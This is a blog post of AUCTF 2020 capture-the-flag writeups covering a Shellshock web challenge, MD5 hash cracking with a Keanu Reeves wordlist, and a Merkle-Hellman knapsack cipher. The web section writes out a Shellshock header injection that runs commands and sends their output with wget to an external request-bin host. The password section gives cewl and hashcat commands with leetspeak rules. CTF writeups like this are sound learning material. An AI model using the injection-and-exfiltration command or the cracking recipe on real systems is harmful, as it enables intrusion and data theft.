---
path: /posts/2020-04-06-auctf-2020-writeups
title: AUCTF 2020 Writeups
date: 2020-04-06
tags: ctf,infosec,writeup,crypto,web
---

Writeups for some AUCTF 2020 challenges I solved. I participated on team `misc` and we came #3.

- web
    - [M1 Abrams](#m1-abrams)
- password cracking
    - [Keanu](#keanu)
- crypto
    - [Sleep On It](#sleep-on-it)

---

# M1 Abrams <a name="m1-abrams"></a>

## web (978pts)

> http://challenges.auctf.com:30024
> 
> We built up this server, and our security team seems pretty mad about it. See if you can find out why.
> 
> Author: shinigami


### Solution

Navigating to the page, we see the default Apache2 page. It was noted during the ctf that dirbusting was allowed, so we begin by dirbusting. Immediately we find a `/cgi-bin/` folder, and within it, a `scriptlet` file which just prints the output of `id`. The scriptlet is vulnerable to shellshock which we can verify by sending `() { :; }; asdf` in a header and seeing that a `500` error is returned. The server also does not have any outbound firewall rules, so we can make it send requests to ourself. We can get the output of commands by base64 encoding it and sending that to a server we have access to:

```bash
> http http://challenges.auctf.com:30024/cgi-bin/scriptlet 'asdf:() { :; }; /bin/bash -c "ls -la / | base64 -w 0 > /tmp/cmd; echo -n https://enw9eh1ly0jxj.x.pipedream.net/ > /tmp/url; cat /tmp/url /tmp/cmd | xargs wget"'
```

In our request bin we see the base64 data which decodes to

```
total 84
drwxr-xr-x   1 root root 4096 Apr  6 02:00 .
drwxr-xr-x   1 root root 4096 Apr  6 02:00 ..
-rwxr-xr-x   1 root root    0 Apr  6 02:00 .dockerenv
drwxr-xr-x   1 root root 4096 Apr  1 14:43 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Apr  6 02:00 dev
drwxr-xr-x   1 root root 4096 Apr  6 02:00 etc
-rw-rw-r--   1 root root  114 Mar 31 19:34 flag.file
drwxr-xr-x   2 root root 4096 Apr 24  2018 home
drwxr-xr-x   1 root root 4096 Apr  1 14:42 lib
drwxr-xr-x   2 root root 4096 Mar 11 21:03 lib64
drwxr-xr-x   2 root root 4096 Mar 11 21:03 media
drwxr-xr-x   2 root root 4096 Mar 11 21:03 mnt
drwxr-xr-x   1 root root 4096 Apr  1 14:42 opt
dr-xr-xr-x 557 root root    0 Apr  6 02:00 proc
drwx------   1 root root 4096 Apr  1 14:42 root
drwxr-xr-x   1 root root 4096 Apr  1 14:42 run
drwxr-xr-x   1 root root 4096 Mar 20 19:20 sbin
drwxr-xr-x   2 root root 4096 Mar 11 21:03 srv
dr-xr-xr-x  13 root root    0 Apr  5 03:54 sys
drwxrwxrwt   1 root root 4096 Apr  6 03:18 tmp
drwxr-xr-x   1 root root 4096 Mar 11 21:03 usr
drwxr-xr-x   1 root root 4096 Apr  1 14:41 var
```

Using the same technique, we get the `flag.file` file which contains:

```
1f8b0808de36755e0003666c61672e747874004b2c4d2e49ab56c93036348c0fce30f08ecf358eaf72484989ace502005a5da5461b000000
```

This is a gzip compressed, we can read this contents with

```bash
$ echo 1f8b0808de36755e0003666c61672e747874004b2c4d2e49ab56c93036348c0fce30f08ecf358eaf72484989ace502005a5da5461b000000 | xxd -r -p | zcat -
auctf{$h311_Sh0K_m3_z@ddY}
```

---

# Keanu <a name="keanu"></a>

## Password Cracking (1000pts)

> My friend Keanu Reeves forgot his password. Can you help him out?
> 
> Hash: `a32480e4c78df0fccfd921d42d2adf03`
> 
> NOTE: The flag is NOT in the standard auctf{} format
> 
> Author: OG_Commando

### Solution

Build a word list from Keanu Reeves' wikipedia page:

```bash
cewl.rb -d 0 -w keanu.list https://en.wikipedia.org/wiki/Keanu_Reeves
```

Run `hashcat` on the hash with some rules to recover the password:

```bash
hashcat -m 0 -a -0 a32480e4c78df0fccfd921d42d2adf03 ./keanu.list -r dive.rule -r leetspeak.rule
.
.
.
a32480e4c78df0fccfd921d42d2adf03:D0g$t@r1991
```

---

# Sleep On It <a name="sleep-on-it"></a>

## Cryptography (1000pts)

> Eve found a mysterious file. Who in their right mind would save something like this? Along with the message came these values:
> 
> `[3, 7, 11, 37, 89, 237, 452]`
> 
> `n = 67 m = 1109`
> 
> The message: ciphertext.txt 
> 
> Author: c

`ciphertext.txt`:

```
[1489, 1351, 1088, 771, 2101, 1272, 972, 1364, 737, 1416, 1702, 1023, 694, 1071, 1349, 2178, 1559, 462, 1020, 2318, 1156, 803, 1709, 469, 1965, 1970, 1842, 1240, 1279, 341, 462, 2178, 1624, 1958, 619, 771, 2161, 803, 1825, 1429, 1965, 1351, 1702, 1240, 1431, 1272, 815, 1668, 737, 1416, 1690, 972, 1156, 1228, 880, 1702, 2161, 1351, 887, 1112, 1431, 1496, 1284, 469, 1885, 1351, 1489, 1313, 1339, 1965, 1617, 1441, 1624, 1540, 418, 771, 1900, 1617, 201, 1760, 737, 1339, 1349, 1441, 1900, 887, 201, 2166, 2161, 1692, 1842, 1240, 1339, 341, 880, 2519, 737, 1416, 619, 418, 1632, 1547, 1441, 815, 1977, 1416, 1088, 1112, 1431, 1757, 1233, 2178, 1808, 1351, 1489, 822, 694, 1489, 880, 469, 1885, 1617, 1221, 2050, 1547, 341, 1407, 1441, 1559, 1958, 619, 771, 1893, 1429, 1291, 1441, 1977, 1769, 1373, 1090, 694, 1489, 1760, 2178, 737, 998, 1349, 1441, 1424, 670, 201, 1221, 1808, 1351, 2043, 1581, 1163, 803, 815, 1284, 737, 1416, 880, 2050, 1071, 341, 1356, 1625, 1624, 1958, 1233, 1441, 1893, 1071, 1709, 1760, 1547, 1199, 1690, 822, 694, 1339, 1702, 469, 1965, 1970, 1501, 1023, 694, 1540, 1088, 1272, 1965, 1970, 887, 771, 2161, 1272, 931, 1023, 2226, 1339, 1842, 353, 694, 1547, 1233, 469, 2318, 1769, 1501, 1240, 1893, 1540, 1552, 2178, 1624, 462, 1020, 1849, 1431, 1496, 1284, 1441, 1559, 261, 1032, 1240, 1692, 1020, 1199, 1284, 2226, 1339, 880, 1709, 1279, 341, 1709, 1441, 737, 1692, 1574, 1849, 1431, 1020, 1349, 1284, 737, 1769, 1501, 1023, 694, 1279, 880, 1349, 1547, 1958, 887, 1112, 1431, 1496, 670, 1702, 1808, 1416, 1020, 822, 694, 1958, 1825, 1429, 1820, 462, 1373, 1240, 1071, 341, 1088, 1429, 1467, 261, 1032, 1977, 1900, 1339, 619, 469, 2318, 1769, 1501, 1240, 1893, 1071, 880, 2178, 1977, 1958, 1221, 1090, 694, 1071, 1088, 1825, 1624, 1958, 1233, 1291, 694, 1339, 1291, 469, 1900, 1552, 1148, 1782, 2161, 803, 815, 2178, 737, 1090, 2043, 1849, 1900, 1228, 1349, 2519, 1900, 1351, 1501, 1023, 694, 542, 880, 1349, 737, 1339, 1020, 972, 1632, 1148, 201, 1429, 1900, 1351, 1088, 1112, 1632, 1155, 201, 2178, 1977, 1958, 1221, 1849, 341, 341, 931, 1760, 1965, 1757, 619, 1112, 1431, 1148, 201, 1364, 2161, 1416, 1221, 1240, 1540, 341, 1709, 1760, 1547, 1757, 619, 771, 1893, 1429, 1349, 469, 1885, 1970, 1574, 1112, 895, 1020, 1349, 2166, 1467, 1339, 2043, 1581, 895, 1011, 972, 2178, 1820, 1617, 418, 771, 2101, 1429, 1088, 1364, 2161, 261, 1020, 1240, 1893, 803, 1709, 2178, 1559, 1757, 880, 1709, 1893, 730, 201, 2009, 1900, 1692, 1233, 1441, 1625, 1540, 1291, 469, 1808, 1692, 1020, 2318, 1156, 1540, 815, 1625, 2226, 1757, 418, 1112, 1632, 1155, 201, 1625, 1885, 1958, 1221, 1581, 1547, 341, 1349, 2043, 1965, 1552, 1501, 1581, 1163, 1489, 1356, 469, 2161, 1540, 1221, 1090, 694, 1965, 1349, 1272, 2226, 1351, 1702, 1581, 1692, 1020, 1349, 469, 1885, 1339, 1221, 1240, 2161, 1540, 972, 469, 1820, 1757, 1221, 1977, 1900, 1020, 880, 1668, 1467, 261, 614, 2519, 1431, 887, 201, 2519, 1624, 1540, 880, 554, 694, 1272, 1709, 469, 1071, 1351, 619, 771, 1893, 1339, 1199, 1825, 1885, 1970, 880, 2050, 542, 341, 1709, 2009, 2161, 261, 1032, 1240, 1424, 1279, 1825, 2178, 1559, 1552, 1088, 1112, 1431, 1547, 1709, 2009, 1900, 1351, 1489, 822, 694, 1011, 1349, 1429, 2161, 1351, 1501, 1240, 1692, 1020, 670, 469, 1808, 1351, 619, 771, 2101, 1540, 972, 1364, 737, 1416, 1221, 822, 694, 1489, 1760, 2178, 737, 1339, 1349, 1782, 1900, 1489, 1356, 469, 1885, 1958, 1221, 1849, 1547, 341, 1088, 1782, 1900, 1958, 1233, 1240, 1156, 1272, 815, 1668, 737, 1351, 2043, 1849, 1900, 1071, 1349, 469, 2161, 1692, 1690, 1977, 1156, 803, 931, 1625, 1965, 261, 1032, 1240, 1156, 1199, 201, 1284, 1900, 998, 1702, 1441, 1692, 201, 201, 1690, 1808, 998, 1690, 1313, 1431, 1221, 972, 2178, 737, 1339, 1221, 1090, 694, 1540, 815, 1625, 2161, 1351, 1489, 2318, 1431, 1272, 815, 2021, 1559, 1970, 418, 1112, 1431, 730, 201, 1760, 2161, 1958, 1349, 1441, 1156, 1697, 1825, 1429, 1885, 261, 1032, 822, 694, 1011, 972, 1760, 1559, 1958, 1373, 1240, 1424, 670, 201, 2101, 2226, 1351, 1501, 1709, 1279, 341, 1349, 1407, 2161, 261, 1020, 2050, 1632, 1540, 1617, 469, 1900, 1757, 1088, 771, 2101, 1429, 1088, 1625, 737, 1769, 1501, 1240, 1279, 341, 1441, 2178, 2161, 1339, 887, 771, 2161, 1228, 880, 1088, 2226, 1351, 1233, 972, 1364, 1339, 1199, 1284, 1547, 1617, 418, 771, 1632, 803, 1825, 2166, 737, 1351, 2043, 1508, 1900, 1547, 1407, 2009, 1965, 462, 1032, 2519, 1431, 1496, 931, 2021, 2161, 1757, 887, 1112, 1431, 1496, 1284, 469, 1965, 1692, 679, 2050, 542, 341, 880, 2519, 737, 737, 1702, 1441, 1625, 1272, 1088, 1625, 1885, 1617, 880, 1291, 694, 1221, 670, 469, 1559, 1416, 880, 2050, 341, 341, 815, 1760, 1965, 1970, 880, 1441, 1424, 730, 201, 1760, 1559, 1958, 887, 1112, 895, 1540, 815, 2178, 1624, 1617, 1221, 2318, 1632, 1339, 815, 1284, 737, 1769, 880, 2050, 1163, 1020, 1199, 2166, 2226, 1339, 1842, 353, 694, 1339, 1199, 1272, 737, 1339, 1221, 1441, 1071, 341, 1155, 1441, 737, 1757, 1702, 1240, 1156, 1199, 201, 1625, 1885, 1958, 1233, 1023, 694, 1808, 1349, 1364, 1547, 462, 679, 2178, 1900, 1339, 1291, 469, 1820, 1958, 1221, 2050, 1632, 679, 201, 1441, 2161, 462, 1032, 822, 353, 1071, 1199, 2101, 1228, 1692, 1032, 1559, 694, 1808, 1760, 1441, 1965, 1757, 619, 1112, 1163, 1339, 462, 1088, 2161, 1339, 1489, 2318, 1431, 1489, 880, 1272, 737, 1508, 619, 1112, 1431, 737, 201, 1156, 1885, 1540, 1221, 554, 694, 1221, 1349, 1364, 1900, 1339, 1842, 1112, 1900, 1071, 1709, 469, 1965, 1540, 619, 771, 1893, 1429, 1088, 1625, 737, 1769, 1148, 1441, 2161, 1540, 972, 2178, 1965, 1351, 619, 771, 1632, 803, 972, 1364, 1900, 1692, 619, 771, 1893, 1228, 1825, 2101, 2161, 261, 1020, 1782, 1156, 1272, 931, 2009, 737, 1339, 1148, 1023, 694, 1808, 1825, 1429, 2161, 261, 679, 1782, 1808, 341, 1709, 2009, 2226, 1351, 619, 771, 2101, 1339, 1291, 1364, 1820, 462, 1020, 1782, 1632, 1020, 972, 469, 2161, 1692, 1501, 1441, 803, 341, 1617, 1760, 1624, 1540, 418, 1112, 1431, 1496, 1284, 469, 2161, 1540, 1221, 1090, 694, 1808, 1760, 1441, 1559, 261, 1032, 1441, 1625, 1540, 815, 469, 1163, 1617, 880, 2318, 1547, 341, 1155, 2009, 2161, 1351, 1489, 1849, 341, 341, 1617, 1441, 1977, 998, 1702, 1291, 694, 1221, 1349, 469, 1965, 1540, 880, 1023, 694, 1228, 880, 1284, 1467, 1351, 1221, 1977, 1156, 1339, 815, 1668, 737, 1416, 1690, 972, 1540, 341, 1617, 2021, 1965, 1970, 887, 771, 2101, 1429, 880, 1088, 737, 1339, 880, 2050, 1547, 341, 1356, 1441, 1559, 1757, 1221, 2318, 1632, 1078, 1349, 1284, 737, 998, 1349, 1441, 1625, 1540, 1356, 469, 1965, 1540, 619, 771, 1632, 1272, 1709, 469, 1808, 1339, 1501, 1291, 694, 1958, 1349, 2178, 1547, 462, 679, 2178, 1900, 1339, 1291, 2166, 2161, 1692, 1842, 1240, 1692, 1272, 1356, 2009, 737, 1351, 1349, 1441, 1547, 341, 1088, 1429, 1820, 462, 1373, 771, 1156, 1339, 1617, 469, 1820, 1339, 880, 1709, 1625, 1272, 1552, 2021, 1808, 998, 1088, 771, 1364, 1757, 880, 1429, 737, 1351, 1702, 1782, 1431, 1228, 1356, 469, 1808, 1339, 1501, 1291, 694, 1071, 1088, 1407, 737, 1351, 1349, 1023, 694, 1489, 1760, 2178, 1559, 261, 1032, 1977, 1692, 1547, 815, 1625, 1547, 1617, 418, 771, 2101, 1272, 1709, 2009, 737, 1757, 1690, 972, 1692, 679, 201, 2178, 1467, 1757, 1221, 822, 694, 803, 815, 2166, 737, 1757, 880, 972, 2161, 1489, 670, 469, 1885, 998, 1702, 1240, 1632, 1071, 1349, 1284, 737, 1416, 880, 2050, 1071, 341, 1825, 1429, 737, 1339, 1148, 1441, 1540, 341, 1088, 1364, 1965, 1540, 1574, 1112, 1900, 1489, 1760, 2178, 1624, 462, 1020, 972, 1424, 1757, 972, 2178, 1808, 1351, 1233, 1240, 1424, 1148, 201, 1284, 1808, 1757, 1148, 2050, 1900, 1071, 1356, 1199, 2226, 1692, 1501, 1023, 694, 1272, 1709, 469, 1977, 1339, 1088, 418, 1632, 1547, 1441, 815, 1977, 1416, 1690, 822, 353, 1958, 880, 1272, 737, 1416, 1702, 353, 694, 1429, 880, 1702, 737, 1339, 1020, 1313, 1163, 1088, 201, 1625, 1885, 1958, 619, 771, 1163, 1339, 1291, 2178, 737, 1339, 1702, 1581, 1632, 1496, 1356, 469, 1467, 1757, 619, 771, 1893, 803, 619, 2178, 737, 1351, 1349, 1023, 694, 1757, 972, 2178, 1808, 1351, 1233, 1023, 694, 1489, 1760, 2178, 737, 1692, 880, 1441, 1156, 1020, 1284, 469, 1808, 1617, 418, 771, 1632, 998, 201, 1088, 1977, 1757, 1373, 1090, 694, 1489, 1760, 2178, 737, 1339, 679, 1441, 1156, 1199, 201, 1284, 1885, 1617, 880, 1977, 1339, 341, 670, 2178, 737, 1757, 1349, 1441, 803, 341, 1349, 1690, 2161, 1351, 887, 1112, 895, 998, 201, 1625, 1885, 1617, 880, 1709, 1431, 1020, 1349, 1284, 1965, 261, 602, 1441, 1900, 1547, 972, 2166, 737, 1351, 2043, 1849, 1431, 1148, 201, 1552, 737, 1757, 679, 1441, 1364, 1020, 1284, 469, 1820, 998, 1702, 1782, 1431, 887, 201, 1441, 1977, 1351, 1088, 759, 1156, 803, 462, 1782, 1965, 1540, 880, 1291, 353, 1279, 880, 1349, 1624, 1552, 1088, 1112, 1431, 1496, 1284, 469, 1965, 1970, 1501, 1023, 353, 1489, 1199, 2021, 1547, 1958, 1221, 1849, 1632, 1540, 1356, 469, 2161, 1540, 1221, 1090, 694, 542, 1349, 469, 1071, 1893, 1020, 1559, 694, 1011, 1199, 1364, 1900, 462, 1032, 1709, 1900, 1808, 815, 469, 1467, 1339, 1221, 972, 803, 341, 1709, 2178, 1808, 1351, 1489, 822, 694, 803, 815, 2166, 737, 1769, 1842, 1581, 1547, 341, 1088, 1364, 1900, 1757, 1690, 1559, 694, 1489, 880, 469, 1965, 1970, 1501, 1023, 694, 1228, 880, 1407, 1808, 998, 1349, 1313, 1431, 1071, 1709, 469, 2318, 1769, 1221, 2318, 803, 341, 670, 1441, 1977, 1351, 887, 1112, 1156, 1540, 1088, 1272, 1965, 1552, 619, 1112, 2161, 1339, 1291, 469, 1467, 1339, 1221, 972, 803, 341, 1702, 1272, 2226, 1757, 880, 2050, 1424, 730, 201, 1702, 1885, 1540, 619, 1112, 1156, 803, 1552, 2178, 737, 1769, 679, 1441, 1424, 1199, 201, 2101, 2161, 1757, 1349, 1441, 1156, 1199, 201, 1760, 1624, 1958, 619, 1112, 1163, 1020, 1349, 1760, 1624, 1970, 880, 2050, 542, 341, 880, 1349, 1965, 462, 1020, 2318, 1156, 1199, 201, 1284, 2161, 1692, 1501, 1441, 1424, 1071, 1709, 1441, 1624, 1970, 1233, 1782, 1071, 341, 1760, 2178, 1808, 1692, 1501, 1441, 1424, 730, 201, 1760, 1559, 1958, 887, 771, 1163, 803, 619, 2021, 1559, 1970, 418, 771, 1156, 1540, 1702, 1349, 1885, 1757, 1233, 1441, 1279, 341, 880, 2519, 737, 998, 1349, 1441, 1424, 1011, 1233, 1760, 1559, 1339, 1702, 1441, 1156, 1540, 1284, 469, 1148, 1416, 1233, 1977, 1156, 1272, 1349, 1364, 737, 1078, 1373, 1581, 1163, 1429, 1088, 2178, 1547, 462, 602, 1965, 815, 1199, 201, 2050, 810, 1356, 1156, 353, 353, 1272, 1155, 469, 810, 1221, 614, 694, 1351, 1228, 1155, 880, 1163, 880, 261, 1356, 1351, 803, 469, 1709, 887, 1221, 1424, 1431, 353, 1416, 1441, 938, 998, 1431, 614, 1088, 1083, 418, 670, 1552, 1083, 880, 1071, 1559, 694, 803, 815, 2166, 737, 1090, 1501, 1240, 2161, 1429, 1088, 2178, 1547, 462, 1032, 1581, 895, 803, 1825, 1429, 1965, 1351, 1088, 1112, 694, 1339, 1199, 1272, 737, 1757, 679, 1441, 1163, 1272, 815, 1668, 737, 1508, 1501, 1441, 1156, 1199, 201, 1407, 2161, 261, 1020, 1240, 1893, 1228, 1825, 1023, 2161, 261, 1032, 1977, 1364, 1148, 201, 1284, 1900, 1199, 2043, 1240, 1424, 1489, 1349, 1272, 2161, 1757, 887, 1112, 1156, 1540, 1088, 1272, 1965, 1552, 619, 771, 1893, 1339, 1407, 2178, 1965, 1970, 1501, 1441, 1156, 1489, 1760, 2178, 1624, 1958, 619, 1112, 694, 1199, 201, 1284, 1885, 1617, 880, 1977, 1339, 341, 1356, 1625, 1624, 1970, 880, 1581, 1547, 341, 1199, 1429, 1965, 1339, 1349, 2318, 1632, 1496, 1709, 2178, 1624, 1617, 1233, 1977, 1692, 1199, 201, 1668, 1547, 1617, 1221, 1240, 1632, 1540, 1356, 614]
```

### Solution

The title and the array of increasing numbers in the description hint that a [knapsack cryptosystem](https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem) is being used. A knapsack cryptosystem is a cryptosystem whose security is based on the hardness of the [knapsack problem](https://en.wikipedia.org/wiki/Knapsack_problem) which is known to be NP-hard. If the weights form a [superincreasing sequence](https://en.wikipedia.org/wiki/Superincreasing_sequence), then the knapsack problem can be easily solved in polynomial time using a greedy approach. In the [Merkle-Hellman knapsack cryptosystem](https://en.wikipedia.org/wiki/Merkle–Hellman_knapsack_cryptosystem), the private key is a superincreasing sequence of numbers, while the public key consists of the same amount of numbers, except they do not have the property that they form a superincreasing sequence. This means an adversary will need to solve the knapsack problem to retrieve the plaintext.

Suppose Bob wants to send Alice a message, encrypted using this cryptosystem.

### Key Creation

Alice chooses a superincreasing sequence of $n$ numbers,

$$w = (w_1, w_2, \ldots, w_n)$$

where $n$ is the number of bits used to represent the message and $w_i > 0$. She then chooses a random integer $q$, where $q > \sum_{i=0}^n w_i$ and a random integer $r$ such that $\gcd(q, r) = 1$. Next, she calculates the sequence

$$b = (b_1, b_2, \ldots, b_n)$$

where $b_i \equiv rw_i \pmod q$.

She publishes $b$ as her public key.

### Encryption

Bob wants to send the message $m = (m_1, m_2, \ldots, m_n)$ where $m_i \in \{0, 1\}$. He computes the value

$$c = \sum_{i=0}^n m_i b_i$$

and sends this to Alice.

### Decryption

Alice first calculates $c' \equiv cr^{-1} \pmod q$. She then uses a greedy algorithm to determine the values of $m_1, m_2, \ldots, m_n$.

To show that this works:

$$\begin{aligned} c' &\equiv cr^{-1} \pmod q \\ &\equiv (m_1 b_2 + m_2 b_2 + \ldots + m_n b_n)r^{-1} \pmod q \\ &\equiv (m_1 r w_1 + m_2 r w_2 + \ldots + m_n r w_n)r^{-1} \pmod q \\ &\equiv (m_1 w_1 + m_2 w_2 + \ldots + m_n w_n) \pmod q \end{aligned}$$

hence, finding which weights give a solution to the knapsack problem for $c'$ will give the bits of $m$.

### Solving the challenge

We are given the private key, so decryption is straightforward:

```python
from Crypto.Util.number import long_to_bytes, inverse
from ciphertext import ct

w = [3, 7, 11, 37, 89, 237, 452]
r = 67
q = 1109

flag = ''
s = inverse(r, q)
for c in ct:
    cprime = c*s % q
    b = ''
    for w_i in reversed(w):
        if cprime - w_i >= 0:
            b += '1'
            cprime = cprime - w_i
        else:
            b += '0'
    b = b[::-1]
    flag += b
print(long_to_bytes(int(flag, 2)))
```

Executing this script prints out another bit of ciphertext (Vigenere):

```
Zk nzcc sv jvve kyrk kyzj dviv grzejkrbzex sliifnvi reu xils-nfid fw r gffi uvmzc fw r JlsJls rggvrij kf yrmv xfev kyiflxy kyv cfex Mrkztrej reu jkivvkjkrccj fw kyv vriky gztbzex lg nyrkvmvi ireufd rccljzfej kf nyrcvj yv tflcu repnrpj wzeu ze rep sffb nyrkjfvmvi jrtivu fi gifwrev Kyvivwfiv pfl dljk efk ze vmvip trjv rk cvrjk krbv kyv yzxxcvupgzxxcvup nyrcv jkrkvdvekj yfnvmvi rlkyvekzt ze kyvjv vokirtkj wfi mvizkrscv xfjgvc tvkfcfxp Wri wifd zk Rj kfltyzex kyv retzvek rlkyfij xvevirccp rj nvcc rj kyv gfvkj yviv rggvrizex kyvjv vokirtkj riv jfcvcp mrclrscv fi vekvikrzezex rj rwwfiuzex r xcretzex sziuj vpv mzvn fw nyrk yrj svve gifdzjtlfljcp jrzu kyflxyk wretzvu reu jlex fw Cvmzrkyre sp drep erkzfej reu xvevirkzfej zetcluzex fli fne Jf wriv kyvv nvcc gffi uvmzc fw r JlsJls nyfjv tfddvekrkfi Z rd Kyfl svcfexvjk kf kyrk yfgvcvjj jrccfn kizsv nyzty ef nzev fw kyzj nficu nzcc vmvi nrid reu wfi nyfd vmve Grcv Jyviip nflcu sv kff ifjpjkifex slk nzky nyfd fev jfdvkzdvj cfmvj kf jzk reu wvvc gffiuvmzczjy kff reu xifn tfemzmzrc lgfe kvrij reu jrp kf kyvd sclekcp nzky wlcc vpvj reu vdgkp xcrjjvj reu ze efk rckfxvkyvi legcvrjrek jruevjjXzmv zk lg JlsJlsj Wfi sp yfn dlty kyv dfiv grzej pv krbv kf gcvrjv kyv nficu sp jf dlty kyv dfiv jyrcc pv wfi vmvi xf kyrebcvjj Nflcu kyrk Z tflcu tcvri flk Yrdgkfe Tflik reu kyv Klzcvizvj wfi pv Slk xlcg ufne pfli kvrij reu yzv rcfwk kf kyv ifprcdrjk nzky pfli yvrikj wfi pfli wizveuj nyf yrmv xfev svwfiv riv tcvrizex flk kyv jvmvejkfizvu yvrmvej reu drbzex ivwlxvvj fw cfexgrdgvivu Xrsizvc Dztyrvc KYV WCRX ZJ C4P3IJLG0ECRPVI5Y0G3P0LVEA0ZU1K reu Irgyrvc rxrzejk pfli tfdzex Yviv pv jkizbv slk jgczekvivu yvrikj kfxvkyvikyviv pv jyrcc jkizbv lejgczekvirscv xcrjjvj
```

which is easily broken (e.g. with [this tool](https://www.guballa.de/vigenere-solver)).

Flag: `auctf{L4Y3RSUP0NLAYER5H0P3Y0UENJ0ID1T}`
